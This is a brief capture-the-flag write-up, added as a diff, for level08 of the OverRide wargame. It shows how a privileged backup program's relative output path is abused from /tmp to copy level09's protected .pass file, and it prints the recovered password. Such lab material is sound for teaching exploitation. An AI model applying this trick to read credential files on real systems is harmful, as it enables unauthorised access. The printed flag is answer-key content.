@@ -1,0 +1,17 @@
+After disassembling the executable and testing its behavior,
+we can see that the program makes a backup of the file passed as an argument into a folder named backups
+
+We therefore need to pass as an argument the path of the file that contains the password of the level09
+on which we do not currently have read rights to, in order to make a copy that we can access
+However, we do not have write permission in the home directory for the backup to take place
+
+We notice that the program uses a relative path for the backup destination
+if we run the program from /tmp, then we will have write permissions and thus be able to create the corresponding folders and subfolders
+
+level08@OverRide:~$> cd /tmp
+level08@OverRide:/tmp$> mkdir -p ./backups/home/users/level09
+
+level08@OverRide:/tmp$> ~/level08 /home/users/level09/.pass
+
+level08@OverRide:/tmp$> cat ./backups/home/users/level09/.pass
+fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
